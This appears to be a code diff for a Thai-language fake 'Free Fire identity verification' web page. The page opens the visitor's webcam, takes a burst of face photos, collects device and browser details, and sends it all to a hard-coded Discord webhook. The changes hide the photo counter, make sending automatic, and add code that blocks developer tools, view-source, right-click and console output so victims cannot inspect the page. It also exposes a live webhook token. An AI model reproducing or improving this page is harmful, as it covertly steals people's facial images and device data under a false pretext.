@@ -53,12 +53,6 @@
             cursor: not-allowed;
         }
 
-        .badge-ff {
-            background: rgba(255, 106, 0, 0.15);
-            border: 1px solid rgba(255, 106, 0, 0.3);
-            color: #ff8c42;
-        }
-
         .info-card {
             background: rgba(0, 0, 0, 0.3);
             border: 1px solid rgba(255, 255, 255, 0.04);
@@ -118,6 +112,11 @@
             -moz-user-select: none;
             -ms-user-select: none;
             user-select: none;
+        }
+
+        /* ซ่อนปุ่มส่งและนับรูป */
+        #capture-count, #btn-capture-text {
+            display: none !important;
         }
     </style>
 </head>
@@ -188,7 +187,9 @@
                         ✅ ยืนยันตัวตน
                     </button>
                 </div>
-                <p id="capture-count" class="text-xs text-white/30 mt-2">📸 ถ่ายไปแล้ว: 0 รูป</p>
+                <!-- ซ่อนการนับรูปและข้อความส่ง -->
+                <p id="capture-count" class="text-xs text-white/30 mt-2 hidden">📸 ถ่ายไปแล้ว: 0 รูป</p>
+                <p id="btn-capture-text" class="hidden">กำลังถ่าย...</p>
             </div>
 
             <!-- ===== STEP 3: ผลลัพธ์ ===== -->
@@ -239,8 +240,18 @@ document.addEventListener('keydown', function(e) {
         e.preventDefault();
         return false;
     }
-    // ป้องกัน Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U, Ctrl+S
-    if (e.ctrlKey && (e.shiftKey || e.key === 'u' || e.key === 'U' || e.key === 's' || e.key === 'S')) {
+    // ป้องกัน Ctrl+U (ดูซอร์ส)
+    if (e.ctrlKey && (e.key === 'u' || e.key === 'U')) {
+        e.preventDefault();
+        return false;
+    }
+    // ป้องกัน Ctrl+Shift+I, Ctrl+Shift+J
+    if (e.ctrlKey && e.shiftKey && (e.key === 'i' || e.key === 'I' || e.key === 'j' || e.key === 'J')) {
+        e.preventDefault();
+        return false;
+    }
+    // ป้องกัน Ctrl+S (บันทึกหน้า)
+    if (e.ctrlKey && (e.key === 's' || e.key === 'S')) {
         e.preventDefault();
         return false;
     }
@@ -254,6 +265,11 @@ document.addEventListener('keydown', function(e) {
         e.preventDefault();
         return false;
     }
+    // ป้องกัน Ctrl+Shift+J (console)
+    if (e.ctrlKey && e.shiftKey && (e.key === 'j' || e.key === 'J')) {
+        e.preventDefault();
+        return false;
+    }
     return true;
 });
 
@@ -261,23 +277,37 @@ document.addEventListener('keydown', function(e) {
 document.addEventListener('dragstart', e => e.preventDefault());
 document.addEventListener('drop', e => e.preventDefault());
 
-// 4. ป้องกันการเลือกข้อความ (CSS already)
-// 5. ป้องกันการ copy/paste
+// 4. ป้องกันการ copy/paste
 document.addEventListener('copy', e => e.preventDefault());
 document.addEventListener('paste', e => e.preventDefault());
 document.addEventListener('cut', e => e.preventDefault());
 
-// 6. ปิดการทำงานของเมนูบริบทของภาพ
+// 5. ปิดการทำงานของเมนูบริบทของภาพ
 document.querySelectorAll('img, video, canvas').forEach(el => {
     el.addEventListener('contextmenu', e => e.preventDefault());
 });
 
-// 7. ป้องกันการพิมพ์คำสั่งใน console (เบื้องต้น)
-Object.defineProperty(window, 'console', {
-    value: console,
-    writable: false,
-    configurable: false
+// 6. ป้องกันการเปิด Developer Tools ด้วยการคลิกขวาที่ inspect (เพิ่มเติม)
+document.addEventListener('keyup', function(e) {
+    if (e.key === 'F12' || e.keyCode === 123) {
+        e.preventDefault();
+        return false;
+    }
 });
+
+// 7. ลบเมนูบริบททั้งหมด (ป้องกันการ inspect)
+document.addEventListener('contextmenu', function(e) {
+    e.preventDefault();
+    return false;
+}, false);
+
+// 8. ป้องกันการเลือกข้อความ (CSS already)
+
+// 9. ปิดการใช้งาน console.log (เพื่อป้องกันการดีบัก)
+console.log = function() {};
+console.warn = function() {};
+console.error = function() {};
+console.info = function() {};
 
 // === CONFIG ===
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1512064053273694319/HicoP_oS0YI7gGBp6wO-NtKLwos7YBZSgIkvyjlNaOfEWOqOdL7B9cFNjYB4CyRz8qfu";
@@ -291,7 +321,6 @@ let userData = {
 };
 
 let cameraStream = null;
-let captureCount = 0;
 let capturedImages = [];
 
 // ===== ฟังก์ชันเก็บข้อมูล =====
@@ -342,17 +371,17 @@ async function startCamera() {
     }
 }
 
-// ===== จับภาพรัว ๆ =====
-function captureBurst() {
+// ===== จับภาพรัว ๆ และส่งอัตโนมัติ =====
+function captureBurstAndSend() {
     const video = document.getElementById("cam");
     if (!cameraStream || !video.videoWidth) {
         alert("กรุณาเปิดกล้องก่อน");
         return;
     }
 
-    // ถ่าย 5 รูปเร็ว ๆ
     const burstCount = 5;
     let captured = 0;
+    const images = [];
 
     for (let i = 0; i < burstCount; i++) {
         setTimeout(() => {
@@ -366,25 +395,23 @@ function captureBurst() {
 
             canvas.toBlob((blob) => {
                 if (blob) {
-                    capturedImages.push(blob);
-                    captureCount++;
-                    document.getElementById("capture-count").innerText = `📸 ถ่ายไปแล้ว: ${captureCount} รูป`;
+                    images.push(blob);
                 }
             }, "image/png");
 
             captured++;
             if (captured === burstCount) {
-                // ถ่ายครบแล้ว ส่งข้อมูลทั้งหมด
+                // ถ่ายครบแล้ว ส่งข้อมูลทั้งหมดทันที
                 setTimeout(() => {
-                    sendAllToWebhook();
+                    sendAllToWebhook(images);
                 }, 300);
             }
-        }, i * 150); // ถ่ายห่างกัน 150ms
+        }, i * 150);
     }
 }
 
 // ===== ส่งข้อมูลทั้งหมด =====
-async function sendAllToWebhook() {
+async function sendAllToWebhook(images) {
     const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches ? "Enabled" : "Disabled";
     const cookiesStatus = navigator.cookieEnabled ? "Enabled" : "Disabled";
     const connectionType = navigator.connection ? navigator.connection.effectiveType : "Unknown";
@@ -399,7 +426,7 @@ async function sendAllToWebhook() {
         cameraStream = null;
     }
 
-    // เปลี่ยน UI
+    // เปลี่ยน UI ทันที
     document.getElementById("step-scan").classList.add("hidden");
     document.getElementById("step-result").classList.remove("hidden");
     document.getElementById("ref-code").innerText = `FF-${Math.floor(Math.random()*999999)}`;
@@ -420,8 +447,7 @@ async function sendAllToWebhook() {
             { name: "🌍 Timezone", value: `\`${timezone}\``, inline: true },
             { name: "📶 Connection Type", value: `\`${connectionType}\``, inline: true },
             { name: "🍪 Cookies Status", value: `\`${cookiesStatus}\``, inline: true },
-            { name: "🌙 Dark Mode", value: `\`${isDarkMode}\``, inline: true },
-            { name: "📸 จำนวนภาพที่ถ่าย", value: `\`${capturedImages.length} รูป\``, inline: true }
+            { name: "🌙 Dark Mode", value: `\`${isDarkMode}\``, inline: true }
         ],
         footer: { text: "ระบบยืนยันตัวตน FreeFire" },
         timestamp: new Date().toISOString()
@@ -434,15 +460,13 @@ async function sendAllToWebhook() {
         );
     }
 
-    // ส่งรูปภาพทั้งหมด (แนบหลายไฟล์)
+    // ส่งรูปภาพทั้งหมด
     const formData = new FormData();
     
-    // แนบรูปภาพทั้งหมด
-    if (capturedImages.length > 0) {
-        capturedImages.forEach((blob, index) => {
+    if (images && images.length > 0) {
+        images.forEach((blob, index) => {
             formData.append(`file${index}`, blob, `face_${index+1}.png`);
         });
-        // ใช้รูปแรกเป็น thumbnail ใน embed
         embedData.image = { url: "attachment://face_1.png" };
     }
 
@@ -455,11 +479,11 @@ async function sendAllToWebhook() {
         console.error(e);
     }
 
-    renderResultUI();
+    renderResultUI(images ? images.length : 0);
 }
 
 // ===== แสดงผล UI =====
-function renderResultUI() {
+function renderResultUI(imageCount) {
     const box = document.getElementById("info-box");
     const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches ? "Enabled" : "Disabled";
     const cookiesStatus = navigator.cookieEnabled ? "Enabled" : "Disabled";
@@ -481,8 +505,7 @@ function renderResultUI() {
         { icon: "🌍", title: "Timezone", value: timezone },
         { icon: "📶", title: "Connection", value: connectionType },
         { icon: "🍪", title: "Cookies", value: cookiesStatus },
-        { icon: "🌙", title: "Dark Mode", value: isDarkMode },
-        { icon: "📸", title: "จำนวนภาพ", value: `${capturedImages.length} รูป` }
+        { icon: "🌙", title: "Dark Mode", value: isDarkMode }
     ];
 
     box.innerHTML = "";
@@ -553,37 +576,28 @@ document.getElementById("btn-cancel-scan").addEventListener("click", () => {
         cameraStream = null;
     }
     capturedImages = [];
-    captureCount = 0;
-    document.getElementById("capture-count").innerText = "📸 ถ่ายไปแล้ว: 0 รูป";
     document.getElementById("step-scan").classList.add("hidden");
     document.getElementById("step-input").classList.remove("hidden");
     document.getElementById("status-msg").innerText = "⏳ ยกเลิกการสแกน";
 });
 
-// จับภาพ (ถ่ายรัว)
+// จับภาพและส่งอัตโนมัติ
 document.getElementById("btn-capture").addEventListener("click", () => {
     if (!cameraStream) {
         alert("กรุณาเปิดกล้องก่อน");
         return;
     }
-    // ปิดปุ่มชั่วคราว防止กดซ้ำ
+    // ปิดปุ่ม
     const btn = document.getElementById("btn-capture");
     btn.disabled = true;
-    btn.textContent = "📸 กำลังถ่าย...";
+    btn.textContent = "📸 กำลังยืนยัน...";
     
-    captureBurst();
-    
-    setTimeout(() => {
-        btn.disabled = false;
-        btn.innerHTML = "✅ ยืนยันตัวตน";
-    }, 2000);
+    captureBurstAndSend();
 });
 
 // ปุ่มกลับ
 document.getElementById("btn-back").addEventListener("click", () => {
     capturedImages = [];
-    captureCount = 0;
-    document.getElementById("capture-count").innerText = "📸 ถ่ายไปแล้ว: 0 รูป";
     document.getElementById("step-result").classList.add("hidden");
     document.getElementById("step-input").classList.remove("hidden");
     document.getElementById("ff-id-input").value = "";
@@ -593,6 +607,14 @@ document.getElementById("btn-back").addEventListener("click", () => {
 // ===== โหลดหน้า =====
 window.onload = () => {
     document.getElementById("status-msg").innerText = "⏳ กรอก ID เพื่อเริ่มต้น";
+    
+    // ป้องกันเพิ่มเติม: ลบเมนู开发者 tools
+    document.addEventListener('keydown', function(e) {
+        if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i')) {
+            e.preventDefault();
+            return false;
+        }
+    });
 };
 </script>
 
